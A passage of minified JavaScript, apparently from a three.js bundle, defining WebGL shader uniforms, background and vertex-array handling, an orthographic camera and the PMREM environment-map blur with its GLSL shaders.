$t(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaTest:{value:0},uvTransform:{value:new ie}},sprite:{diffuse:{value:new $t(16777215)},opacity:{value:1},center:{value:new re(.5,.5)},rotation:{value:0},map:{value:null},alphaMap:{value:null},alphaTest:{value:0},uvTransform:{value:new ie}}},Jn={basic:{uniforms:In([Yn.common,Yn.specularmap,Yn.envmap,Yn.aomap,Yn.lightmap,Yn.fog]),vertexShader:Xn.meshbasic_vert,fragmentShader:Xn.meshbasic_frag},lambert:{uniforms:In([Yn.common,Yn.specularmap,Yn.envmap,Yn.aomap,Yn.lightmap,Yn.emissivemap,Yn.fog,Yn.lights,{emissive:{value:new $t(0)}}]),vertexShader:Xn.meshlambert_vert,fragmentShader:Xn.meshlambert_frag},phong:{uniforms:In([Yn.common,Yn.specularmap,Yn.envmap,Yn.aomap,Yn.lightmap,Yn.emissivemap,Yn.bumpmap,Yn.normalmap,Yn.displacementmap,Yn.fog,Yn.lights,{emissive:{value:new $t(0)},specular:{value:new $t(1118481)},shininess:{value:30}}]),vertexShader:Xn.meshphong_vert,fragmentShader:Xn.meshphong_frag},standard:{uniforms:In([Yn.common,Yn.envmap,Yn.aomap,Yn.lightmap,Yn.emissivemap,Yn.bumpmap,Yn.normalmap,Yn.displacementmap,Yn.roughnessmap,Yn.metalnessmap,Yn.fog,Yn.lights,{emissive:{value:new $t(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:Xn.meshphysical_vert,fragmentShader:Xn.meshphysical_frag},toon:{uniforms:In([Yn.common,Yn.aomap,Yn.lightmap,Yn.emissivemap,Yn.bumpmap,Yn.normalmap,Yn.displacementmap,Yn.gradientmap,Yn.fog,Yn.lights,{emissive:{value:new $t(0)}}]),vertexShader:Xn.meshtoon_vert,fragmentShader:Xn.meshtoon_frag},matcap:{uniforms:In([Yn.common,Yn.bumpmap,Yn.normalmap,Yn.displacementmap,Yn.fog,{matcap:{value:null}}]),vertexShader:Xn.meshmatcap_vert,fragmentShader:Xn.meshmatcap_frag},points:{uniforms:In([Yn.points,Yn.fog]),vertexShader:Xn.points_vert,fragmentShader:Xn.points_frag},dashed:{uniforms:In([Yn.common,Yn.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Xn.linedashed_vert,fragmentShader:Xn.linedashed_frag},depth:{uniforms:In([Yn.common,Yn.displacementmap]),vertexShader:Xn.depth_vert,fragmentShader:Xn.depth_frag},normal:{uniforms:In([Yn.common,Yn.bumpmap,Yn.normalmap,Yn.displacementmap,{opacity:{value:1}}]),vertexShader:Xn.meshnormal_vert,fragmentShader:Xn.meshnormal_frag},sprite:{uniforms:In([Yn.sprite,Yn.fog]),vertexShader:Xn.sprite_vert,fragmentShader:Xn.sprite_frag},background:{uniforms:{uvTransform:{value:new ie},t2D:{value:null}},vertexShader:Xn.background_vert,fragmentShader:Xn.background_frag},cube:{uniforms:In([Yn.envmap,{opacity:{value:1}}]),vertexShader:Xn.cube_vert,fragmentShader:Xn.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:Xn.equirect_vert,fragmentShader:Xn.equirect_frag},distanceRGBA:{uniforms:In([Yn.common,Yn.displacementmap,{referencePosition:{value:new ye},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:Xn.distanceRGBA_vert,fragmentShader:Xn.distanceRGBA_frag},shadow:{uniforms:In([Yn.lights,Yn.fog,{color:{value:new $t(0)},opacity:{value:1}}]),vertexShader:Xn.shadow_vert,fragmentShader:Xn.shadow_frag}};function Zn(e,t,n,r,i){var a,o,l=new $t(0),c=0,u=null,d=0,p=null;function h(e,t){n.buffers.color.setClear(e.r,e.g,e.b,t,i)}return{getClearColor:function(){return l},setClearColor:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1;l.set(e),h(l,c=t)},getClearAlpha:function(){return c},setClearAlpha:function(e){h(l,c=e)},render:function(n,i){var f=!1,A=!0===i.isScene?i.background:null;A&&A.isTexture&&(A=t.get(A));var m=e.xr,v=m.getSession&&m.getSession();v&&"additive"===v.environmentBlendMode&&(A=null),null===A?h(l,c):A&&A.isColor&&(h(A,1),f=!0),(e.autoClear||f)&&e.clear(e.autoClearColor,e.autoClearDepth,e.autoClearStencil),A&&(A.isCubeTexture||A.mapping===s)?(void 0===o&&((o=new Bn(new Tn(1,1,1),new Ln({name:"BackgroundCubeMaterial",uniforms:Pn(Jn.cube.uniforms),vertexShader:Jn.cube.vertexShader,fragmentShader:Jn.cube.fragmentShader,side:1,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.deleteAttribute("normal"),o.geometry.deleteAttribute("uv"),o.onBeforeRender=function(e,t,n){this.matrixWorld.copyPosition(n.matrixWorld)},Object.defineProperty(o.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),r.update(o)),o.material.uniforms.envMap.value=A,o.material.uniforms.flipEnvMap.value=A.isCubeTexture&&!1===A.isRenderTargetTexture?-1:1,u===A&&d===A.version&&p===e.toneMapping||(o.material.needsUpdate=!0,d=(u=A).version,p=e.toneMapping),n.unshift(o,o.geometry,o.material,0,0,null)):A&&A.isTexture&&(void 0===a&&((a=new Bn(new qn(2,2),new Ln({name:"BackgroundMaterial",uniforms:Pn(Jn.background.uniforms),vertexShader:Jn.background.vertexShader,fragmentShader:Jn.background.fragmentShader,side:0,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.deleteAttribute("normal"),Object.defineProperty(a.material,"map",{get:function(){return this.uniforms.t2D.value}}),r.update(a)),!0===(a.material.uniforms.t2D.value=A).matrixAutoUpdate&&A.updateMatrix(),a.material.uniforms.uvTransform.value.copy(A.matrix),u===A&&d===A.version&&p===e.toneMapping||(a.material.needsUpdate=!0,d=(u=A).version,p=e.toneMapping),n.unshift(a,a.geometry,a.material,0,0,null))}}}function er(e,t,n,r){var i=e.getParameter(e.MAX_VERTEX_ATTRIBS),a=r.isWebGL2?null:t.get("OES_vertex_array_object"),o=r.isWebGL2||null!==a,s={},l=p(null),c=l;function u(t){return r.isWebGL2?e.bindVertexArray(t):a.bindVertexArrayOES(t)}function d(t){return r.isWebGL2?e.deleteVertexArray(t):a.deleteVertexArrayOES(t)}function p(e){for(var t=[],n=[],r=[],a=0;a<i;a++)t[a]=0,n[a]=0,r[a]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:t,enabledAttributes:n,attributeDivisors:r,object:e,attributes:{},index:null}}function h(){for(var e=c.newAttributes,t=0,n=e.length;t<n;t++)e[t]=0}function f(e){A(e,0)}function A(n,i){var a=c.newAttributes,o=c.enabledAttributes,s=c.attributeDivisors;a[n]=1,0===o[n]&&(e.enableVertexAttribArray(n),o[n]=1),s[n]!==i&&((r.isWebGL2?e:t.get("ANGLE_instanced_arrays"))[r.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](n,i),s[n]=i)}function m(){for(var t=c.newAttributes,n=c.enabledAttributes,r=0,i=n.length;r<i;r++)n[r]!==t[r]&&(e.disableVertexAttribArray(r),n[r]=0)}function v(t,n,i,a,o,s){!0!==r.isWebGL2||i!==e.INT&&i!==e.UNSIGNED_INT?e.vertexAttribPointer(t,n,i,a,o,s):e.vertexAttribIPointer(t,n,i,o,s)}function g(){y(),c!==l&&u((c=l).object)}function y(){l.geometry=null,l.program=null,l.wireframe=!1}return{setup:function(i,l,d,g,y){var b=!1;if(o){var _=function(t,n,i){var o=!0===i.wireframe,l=s[t.id];void 0===l&&(l={},s[t.id]=l);var c=l[n.id];void 0===c&&(c={},l[n.id]=c);var u=c[o];return void 0===u&&(u=p(r.isWebGL2?e.createVertexArray():a.createVertexArrayOES()),c[o]=u),u}(g,d,l);c!==_&&u((c=_).object),(b=function(e,t){var n=c.attributes,r=e.attributes,i=0;for(var a in r){var o=n[a],s=r[a];if(void 0===o)return!0;if(o.attribute!==s)return!0;if(o.data!==s.data)return!0;i++}return c.attributesNum!==i||c.index!==t}(g,y))&&function(e,t){var n={},r=e.attributes,i=0;for(var a in r){var o=r[a],s={};(s.attribute=o).data&&(s.data=o.data),n[a]=s,i++}c.attributes=n,c.attributesNum=i,c.index=t}(g,y)}else{var w=!0===l.wireframe;c.geometry===g.id&&c.program===d.id&&c.wireframe===w||(c.geometry=g.id,c.program=d.id,c.wireframe=w,b=!0)}!0===i.isInstancedMesh&&(b=!0),null!==y&&n.update(y,e.ELEMENT_ARRAY_BUFFER),b&&(function(i,a,o,s){if(!1!==r.isWebGL2||!i.isInstancedMesh&&!s.isInstancedBufferGeometry||null!==t.get("ANGLE_instanced_arrays")){h();var l=s.attributes,c=o.getAttributes(),u=a.defaultAttributeValues;for(var d in c){var p=c[d];if(0<=p.location){var g=l[d];if(void 0===g&&("instanceMatrix"===d&&i.instanceMatrix&&(g=i.instanceMatrix),"instanceColor"===d&&i.instanceColor&&(g=i.instanceColor)),void 0!==g){var y=g.normalized,b=g.itemSize,_=n.get(g);if(void 0===_)continue;var w=_.buffer,C=_.type,x=_.bytesPerElement;if(g.isInterleavedBufferAttribute){var S=g.data,k=S.stride,M=g.offset;if(S&&S.isInstancedInterleavedBuffer){for(var B=0;B<p.locationSize;B++)A(p.location+B,S.meshPerAttribute);!0!==i.isInstancedMesh&&void 0===s._maxInstanceCount&&(s._maxInstanceCount=S.meshPerAttribute*S.count)}else for(var E=0;E<p.locationSize;E++)f(p.location+E);e.bindBuffer(e.ARRAY_BUFFER,w);for(var T=0;T<p.locationSize;T++)v(p.location+T,b/p.locationSize,C,y,k*x,(M+b/p.locationSize*T)*x)}else{if(g.isInstancedBufferAttribute){for(var P=0;P<p.locationSize;P++)A(p.location+P,g.meshPerAttribute);!0!==i.isInstancedMesh&&void 0===s._maxInstanceCount&&(s._maxInstanceCount=g.meshPerAttribute*g.count)}else for(var I=0;I<p.locationSize;I++)f(p.location+I);e.bindBuffer(e.ARRAY_BUFFER,w);for(var F=0;F<p.locationSize;F++)v(p.location+F,b/p.locationSize,C,y,b*x,b/p.locationSize*F*x)}}else if(void 0!==u){var L=u[d];if(void 0!==L)switch(L.length){case 2:e.vertexAttrib2fv(p.location,L);break;case 3:e.vertexAttrib3fv(p.location,L);break;case 4:e.vertexAttrib4fv(p.location,L);break;default:e.vertexAttrib1fv(p.location,L)}}}}m()}}(i,l,d,g),null!==y&&e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,n.get(y).buffer))},reset:g,resetDefaultState:y,dispose:function(){for(var e in g(),s){var t=s[e];for(var n in t){var r=t[n];for(var i in r)d(r[i].object),delete r[i];delete t[n]}delete s[e]}},releaseStatesOfGeometry:function(e){if(void 0!==s[e.id]){var t=s[e.id];for(var n in t){var r=t[n];for(var i in r)d(r[i].object),delete r[i];delete t[n]}delete s[e.id]}},releaseStatesOfProgram:function(e){for(var t in s){var n=s[t];if(void 0!==n[e.id]){var r=n[e.id];for(var i in r)d(r[i].object),delete r[i];delete n[e.id]}}},initAttributes:h,enableAttribute:f,disableUnusedAttributes:m}}function tr(e,t,n,r){var i,a=r.isWebGL2;this.setMode=function(e){i=e},this.render=function(t,r){e.drawArrays(i,t,r),n.update(r,i,1)},this.renderInstances=function(r,o,s){if(0!==s){var l,c;if(a)l=e,c="drawArraysInstanced";else if(c="drawArraysInstancedANGLE",null===(l=t.get("ANGLE_instanced_arrays")))return;l[c](i,r,o,s),n.update(o,i,s)}}}function nr(e,t,n){var r;function i(t){if("highp"===t){if(0<e.getShaderPrecisionFormat(e.VERTEX_SHADER,e.HIGH_FLOAT).precision&&0<e.getShaderPrecisionFormat(e.FRAGMENT_SHADER,e.HIGH_FLOAT).precision)return"highp";t="mediump"}return"mediump"===t&&0<e.getShaderPrecisionFormat(e.VERTEX_SHADER,e.MEDIUM_FLOAT).precision&&0<e.getShaderPrecisionFormat(e.FRAGMENT_SHADER,e.MEDIUM_FLOAT).precision?"mediump":"lowp"}var a="undefined"!=typeof WebGL2RenderingContext&&e instanceof WebGL2RenderingContext||"undefined"!=typeof WebGL2ComputeRenderingContext&&e instanceof WebGL2ComputeRenderingContext,o=void 0!==n.precision?n.precision:"highp",s=i(o);s!==o&&(o=s);var l=a||t.has("WEBGL_draw_buffers"),c=!0===n.logarithmicDepthBuffer,u=e.getParameter(e.MAX_TEXTURE_IMAGE_UNITS),d=e.getParameter(e.MAX_VERTEX_TEXTURE_IMAGE_UNITS),p=e.getParameter(e.MAX_TEXTURE_SIZE),h=e.getParameter(e.MAX_CUBE_MAP_TEXTURE_SIZE),f=e.getParameter(e.MAX_VERTEX_ATTRIBS),A=e.getParameter(e.MAX_VERTEX_UNIFORM_VECTORS),m=e.getParameter(e.MAX_VARYING_VECTORS),v=e.getParameter(e.MAX_FRAGMENT_UNIFORM_VECTORS),g=0<d,y=a||t.has("OES_texture_float");return{isWebGL2:a,drawBuffers:l,getMaxAnisotropy:function(){if(void 0!==r)return r;if(!0===t.has("EXT_texture_filter_anisotropic")){var n=t.get("EXT_texture_filter_anisotropic");r=e.getParameter(n.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else r=0;return r},getMaxPrecision:i,precision:o,logarithmicDepthBuffer:c,maxTextures:u,maxVertexTextures:d,maxTextureSize:p,maxCubemapSize:h,maxAttributes:f,maxVertexUniforms:A,maxVaryings:m,maxFragmentUniforms:v,vertexTextures:g,floatFragmentTextures:y,floatVertexTextures:g&&y,maxSamples:a?e.getParameter(e.MAX_SAMPLES):0}}function rr(e){var t=this,n=null,r=0,i=!1,a=!1,o=new Hn,s=new ie,l={value:null,needsUpdate:!1};function c(){l.value!==n&&(l.value=n,l.needsUpdate=0<r),t.numPlanes=r,t.numIntersection=0}function u(e,n,r,i){var a=null!==e?e.length:0,c=null;if(0!==a){if(c=l.value,!0!==i||null===c){var u=r+4*a,d=n.matrixWorldInverse;s.getNormalMatrix(d),(null===c||c.length<u)&&(c=new Float32Array(u));for(var p=0,h=r;p!==a;++p,h+=4)o.copy(e[p]).applyMatrix4(d,s),o.normal.toArray(c,h),c[h+3]=o.constant}l.value=c,l.needsUpdate=!0}return t.numPlanes=a,t.numIntersection=0,c}this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(e,t,a){var o=0!==e.length||t||0!==r||i;return i=t,n=u(e,a,0),r=e.length,o},this.beginShadows=function(){a=!0,u(null)},this.endShadows=function(){a=!1,c()},this.setState=function(t,o,s){var d=t.clippingPlanes,p=t.clipIntersection,h=t.clipShadows,f=e.get(t);if(!i||null===d||0===d.length||a&&!h)a?u(null):c();else{var A=a?0:r,m=4*A,v=f.clippingState||null;l.value=v,v=u(d,o,m,s);for(var g=0;g!==m;++g)v[g]=n[g];f.clippingState=v,this.numIntersection=p?this.numPlanes:0,this.numPlanes+=A}}}function ir(e){var t=new WeakMap;function n(e,t){return t===a?e.mapping=r:t===o&&(e.mapping=i),e}function s(e){var n=e.target;n.removeEventListener("dispose",s);var r=t.get(n);void 0!==r&&(t.delete(n),r.dispose())}return{get:function(r){if(r&&r.isTexture&&!1===r.isRenderTargetTexture){var i=r.mapping;if(i===a||i===o){if(t.has(r))return n(t.get(r).texture,r.mapping);var l=r.image;if(l&&0<l.height){var c=e.getRenderTarget(),u=new jn(l.height/2);return u.fromEquirectangularTexture(e,r),t.set(r,u),e.setRenderTarget(c),r.addEventListener("dispose",s),n(u.texture,r.mapping)}return null}}return r},dispose:function(){t=new WeakMap}}}Jn.physical={uniforms:In([Jn.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatNormalScale:{value:new re(1,1)},clearcoatNormalMap:{value:null},sheen:{value:0},sheenColor:{value:new $t(0)},sheenColorMap:{value:null},sheenRoughness:{value:0},sheenRoughnessMap:{value:null},transmission:{value:0},transmissionMap:{value:null},transmissionSamplerSize:{value:new re},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},attenuationDistance:{value:0},attenuationColor:{value:new $t(0)},specularIntensity:{value:0},specularIntensityMap:{value:null},specularColor:{value:new $t(1,1,1)},specularColorMap:{value:null}}]),vertexShader:Xn.meshphysical_vert,fragmentShader:Xn.meshphysical_frag};var ar=function(e){_inherits2(n,On);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:-1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:-1,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:.1,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:2e3;return _classCallCheck2(this,n),(e=t.call(this)).type="OrthographicCamera",e.zoom=1,e.view=null,e.left=r,e.right=i,e.top=a,e.bottom=o,e.near=s,e.far=l,e.updateProjectionMatrix(),e}return _createClass2(n,[{key:"copy",value:function(e,t){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e,t),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=null===e.view?null:Object.assign({},e.view),this}},{key:"setViewOffset",value:function(e,t,n,r,i,a){null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=n,this.view.offsetY=r,this.view.width=i,this.view.height=a,this.updateProjectionMatrix()}},{key:"clearViewOffset",value:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()}},{key:"updateProjectionMatrix",value:function(){var e=(this.right-this.left)/(2*this.zoom),t=(this.top-this.bottom)/(2*this.zoom),n=(this.right+this.left)/2,r=(this.top+this.bottom)/2,i=n-e,a=n+e,o=r+t,s=r-t;if(null!==this.view&&this.view.enabled){var l=(this.right-this.left)/this.view.fullWidth/this.zoom,c=(this.top-this.bottom)/this.view.fullHeight/this.zoom;a=(i+=l*this.view.offsetX)+l*this.view.width,s=(o-=c*this.view.offsetY)-c*this.view.height}this.projectionMatrix.makeOrthographic(i,a,o,s,this.near,this.far),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return t.object.zoom=this.zoom,t.object.left=this.left,t.object.right=this.right,t.object.top=this.top,t.object.bottom=this.bottom,t.object.near=this.near,t.object.far=this.far,null!==this.view&&(t.object.view=Object.assign({},this.view)),t}}]),n}();ar.prototype.isOrthographicCamera=!0;var or=function(e){_inherits2(n,Ln);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this,e)).type="RawShaderMaterial",r}return n}();or.prototype.isRawShaderMaterial=!0;var sr=Math.pow(2,8),lr=[.125,.215,.35,.446,.526,.582],cr=5+lr.length,ur=(_defineProperty2(t={},R,0),_defineProperty2(t,j,1),t),dr=new ar,pr=function(){for(var e=[],t=[],n=[],r=8,i=0;i<cr;i++){var a=Math.pow(2,r);t.push(a);var o=1/a;4<i?o=lr[i-8+4-1]:0==i&&(o=0),n.push(o);for(var s=1/(a-1),l=-s/2,c=1+s/2,u=[l,l,c,l,c,c,l,l,c,c,l,c],d=new Float32Array(108),p=new Float32Array(72),h=new Float32Array(36),f=0;f<6;f++){var A=f%3*2/3-1,m=2<f?0:-1,v=[A,m,0,A+2/3,m,0,A+2/3,m+1,0,A,m,0,A+2/3,m+1,0,A,m+1,0];d.set(v,18*f),p.set(u,12*f);var g=[f,f,f,f,f,f];h.set(g,6*f)}var y=new un;y.setAttribute("position",new Qt(d,3)),y.setAttribute("uv",new Qt(p,2)),y.setAttribute("faceIndex",new Qt(h,1)),e.push(y),4<r&&r--}return{_lodPlanes:e,_sizeLods:t,_sigmas:n}}(),hr=pr._lodPlanes,fr=pr._sizeLods,Ar=pr._sigmas,mr=new $t,vr=null,gr=(1+Math.sqrt(5))/2,yr=1/gr,br=[new ye(1,1,1),new ye(-1,1,1),new ye(1,1,-1),new ye(-1,1,-1),new ye(0,gr,yr),new ye(0,gr,-yr),new ye(yr,0,gr),new ye(-yr,0,gr),new ye(gr,yr,0),new ye(-gr,yr,0)],_r=function(){function e(t){var n,r;_classCallCheck2(this,e),this._renderer=t,this._pingPongRenderTarget=null,this._blurMaterial=(20,n=new Float32Array(20),r=new ye(0,1,0),new or({name:"SphericalGaussianBlur",defines:{n:20},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:n},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:r}},vertexShader:"\n\n\t\tprecision mediump float;\n\t\tprecision mediump int;\n\n\t\tattribute vec3 position;\n\t\tattribute vec2 uv;\n\t\tattribute float faceIndex;\n\n\t\tvarying vec3 vOutputDirection;\n\n\t\t// RH coordinate system; PMREM face-indexing convention\n\t\tvec3 getDirection( vec2 uv, float face ) {\n\n\t\t\tuv = 2.0 * uv - 1.0;\n\n\t\t\tvec3 direction = vec3( uv, 1.0 );\n\n\t\t\tif ( face == 0.0 ) {\n\n\t\t\t\tdirection = direction.zyx; // ( 1, v, u ) pos x\n\n\t\t\t} else if ( face == 1.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xz *= -1.0; // ( -u, 1, -v ) pos y\n\n\t\t\t} else if ( face == 2.0 ) {\n\n\t\t\t\tdirection.x *= -1.0; // ( -u, v, 1 ) pos z\n\n\t\t\t} else if ( face == 3.0 ) {\n\n\t\t\t\tdirection = direction.zyx;\n\t\t\t\tdirection.xz *= -1.0; // ( -1, v, -u ) neg x\n\n\t\t\t} else if ( face == 4.0 ) {\n\n\t\t\t\tdirection = direction.xzy;\n\t\t\t\tdirection.xy *= -1.0; // ( -u, -1, v ) neg y\n\n\t\t\t} else if ( face == 5.0 ) {\n\n\t\t\t\tdirection.z *= -1.0; // ( u, v, -1 ) neg z\n\n\t\t\t}\n\n\t\t\treturn direction;\n\n\t\t}\n\n\t\tvoid main() {\n\n\t\t\tvOutputDirection = getDirection( uv, faceIndex );\n\t\t\tgl_Position = vec4( position, 1.0 );\n\n\t\t}\n\t",fragmentShader:"\n\n\t\t\tprecision mediump float;\n\t\t\tprecision mediump int;\n\n\t\t\tvarying vec3 vOutputDirection;\n\n\t\t\tuniform sampler2D envMap;\n\t\t\tuniform int samples;\n\t\t\tuniform float weights[ n ];\n\t\t\tuniform bool latitudinal;\n\t\t\tuniform float dTheta;\n\t\t\tuniform float mipInt;\n\t\t\tuniform vec3 poleAxis;\n\n\t\t\t".concat("\n\n\t\tuniform int inputEncoding;\n\n\t\t#include <encodings_pars_fragment>\n\n\t\tvec4 inputTexelToLinear( vec4 value ) {\n\n\t\t\tif ( inputEncoding == 0 ) {\n\n\t\t\t\treturn value;\n\n\t\t\t} else {\n\n\t\t\t\treturn sRGBToLinear( value );\n\n\t\t\t}\n\n\t\t}\n\n\t\tvec4 envMapTexelToLinear( vec4 color ) {\n\n\t\t\treturn inputTexelToLinear( color );\n\n\t\t}\n\t","\n\n\t\t\t#define ENVMAP_TYPE_CUBE_UV\n\t\t\t#include <cube_uv_reflection_fragment>\n\n\t\t\tvec3 getSample( float theta, vec3 axis ) {\n\n\t\t\t\tfloat cosTheta = cos( theta );\n\t\t\t\t// Rodrigues' axis-angle rotation\n\t\t\t\tvec3 sampleDirection = vOutputDirection * cosTheta\n\t\t\t\t\t+ cross( axis, vOutputDirection ) * sin( theta )\n\t\t\t\t\t+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );\n\n\t\t\t\treturn bilinearCubeUV( envMap, sampleDirection, mipInt );\n\n\t\t\t}\n\n\t\t\tvoid main() {\n\n\t\t\t\tvec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );\n\n\t\t\t\tif ( all( equal( axis, vec3( 0.0 ) ) ) ) {\n\n\t\t\t\t\taxis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );\n\n\t\t\t\t}\n\n\t\t\t\taxis = normalize( axis );\n\n\t\t\t\tgl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );\n\t\t\t\tgl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );\n\n\t\t\t\tfor ( int i = 1; i < n; i++ ) {\n\n\t\t\t\t\tif ( i >= samples ) {\n\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t}\n\n\t\t\t\t\tfloat theta = dTheta * float( i );\n\t\t\t\t\tgl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );\n\t\t\t\t\tgl_FragColor.rgb += weights[ i ] * getSample( theta, axis );\n\n\t\t\t\t}\n\n\t\t\t}\n\t\t"),blending:0,depthTest:!1,depthWrite:!1})),this._equirectShader=null,this._cubemapShader=null,this._compileMaterial(this._blurMaterial)}return _createClass2(e,[{key:"fromScene",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:.1,r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:100;vr=this._renderer.getRenderTarget();var i=this._allocateTargets();return this._sceneToCubeUV(e,n,r,i),0<t&&this._blur(i,0,0,t),this._applyPMREM(i),this._cleanup(i),i}},{key:"fromEquirectangular",value:function(e){return this._fromTexture(e)}},{key:"fromCubemap",value:function(e){return this._fromTexture(e)}},{key:"compileCubemapShader",value:function(){null===this._cubemapShader&&(this._cubemapShader=Sr(),this._compileMaterial(this._cubemapShader))}},{key:"compileEquirectangularShader",value:function(){null===this._equirectShader&&(this._equirectShader=xr(),this._compileMaterial(this._equirectShader))}},{key:"dispose",value:function(){this._blurMaterial.dispose(),null!==this._cubemapShader&&this._cubemapShader.dispose(),null!==this._equirectShader&&this._equirectShader.dispose();for(var e=0;e<hr.length;e++)hr[e].dispose()}},{key:"_cleanup",value:function(e){this._pingPongRenderTarget.dispose(),this._renderer.setRenderTarget(vr),e.scissorTest=!1,Cr(e,0,0,e.width,e.height)}},{key:"_fromTexture",value:function(e){vr=this._renderer.getRenderTarget();var t=this._allocateTargets(e);return this._textureToCubeUV(e,t),this._applyPMREM(t),this._cleanup(t),t}},{key:"_allocateTargets",value:function(e){var t={magFilter:A,minFilter:A,generateMipmaps:!1,type:w,format:S,encoding:R,depthBuffer:!1},n=wr(t);return n.depthBuffer=!e,this._pingPongRenderTarget=wr(t),n}},{key:"_compileMaterial",value:function(e){var t=new Bn(hr[0],e);this._renderer.compile(t,dr)}},{key:"_sceneToCubeUV",value:function(e,t,n,r){var i=new Nn(90,1,t,n),a=[1,-1,1,1,1,1],o=[1,1,1,-1,-1,-1],s=this._renderer,l=s.autoClear,c=s.toneMapping;s.getClearColor(mr),s.toneMapping=0,s.autoClear=!1;var u=new zt({name:"PMREM.Background",side:1,depthWrite:!1,depthTest:!1}),d=new Bn(new Tn,u),p=!1,h=e.background;h?h.isColor&&(u.color.copy(h),p=!(e.background=null)):(u.color.copy(mr),p=!0);for(var f=0;f<6;f++){var A=f%3;0==A?(i.up.set(0,a[f],0),i.lookAt(o[f],0,0)):1==A?(i.up.set(0,0,a[f]),i.lookAt(0,o[f],0)):(i.up.set(0,a[f],0),i.lookAt(0,0,o[f])),Cr(r,A*sr,2<f?sr:0,sr,sr),s.setRenderTarget(r),p&&s.render(d,i),s.render(e,i)}d.geometry.dispose(),d.material.dispose(),s.toneMapping=c,s.autoClear=l,e.background=h}},{key:"_setEncoding",value:function(e,t){!0===this._renderer.capabilities.isWebGL2&&t.format===S&&t.type===g&&t.encoding===j?e.value=ur[R]:e.value=ur[t.encoding]}},{key:"_textureToCubeUV",value:function(e,t){var n=this._renderer,a=e.mapping===r||e.mapping===i;a?null==this._cubemapShader&&(this._cubemapShader=Sr()):null==this._equirectShader&&(this._equirectShader=xr());var o=a?this._cubemapShader:this._equirectShader,s=new Bn(hr[0],o),l=o.uniforms;l.envMap.value=e,a||l.texelSize.value.set(1/e.image.width,1/e.image.height),this._setEncoding(l.inputEncoding,e),Cr(t,0,0,3*sr,2*sr),n.setRenderTarget(t),n.render(s,dr)}},{key:"_applyPMREM",value:function(e){var t=this._renderer,n=t.autoClear;t.autoClear=!1;for(var r=1;r<cr;r++){var i=Math.sqrt(Ar[r]*Ar[r]-Ar[r-1]*Ar[r-1]),a=br[(r-1)%br.length];this._blur(e,r-1,r,i,a)}t.autoClear=n}},{key:"_blur",value:function(e,t,n,r,i){var a=this._pingPongRenderTarget;this._halfBlur(e,a,t,n,r,"latitudinal",i),this._halfBlur(a,e,n,n,r,"longitudinal",i)}},{key:"_halfBlur",value:function(e,t,n,r,i,a,o){for(var s=this._renderer,l=this._blurMaterial,c=new Bn(hr[r],l),u=l.uniforms,d=fr[n]-1,p=isFinite(i)?Math.PI/(2*d):2*Math.PI/39,h=i/p,f=isFinite(i)?1+Math.floor(3*h):20,A=[],m=0,v=0;v<20;++v){var g=v/h,y=Math.exp(-g*g/2);A.push(y),0==v?m+=y:v<f&&(m+=2*y)}for(var b=0;b<A.length;b++)A[b]=A[b]/m;u.envMap.value=e.texture,u.samples.value=f,u.weights.value=A,u.latitudinal.value="latitudinal"===a,o&&(u.poleAxis.value=o),u.dTheta.value=p,u.mipInt.value=8-n;var _=fr[r];Cr(t,3*Math.max(0,sr-2*_),(0===r?0:2*sr)+2*_*(4<r?r-8+4:0),3*_,2*_),s.setRenderTarget(t),s.render(c,dr)}}]),e}();function wr(e){var t=new Ae(3*sr,3*sr,e);return t.texture.mapping=s,t.texture.name="PMREM.cubeUv",t.scissorTest=!0,t}function Cr(e,t,n,r,i){e.viewport.set(t,n,r,i),e.scissor.set(t,n,r,i)}function xr(){var e=new re(1,1);return new 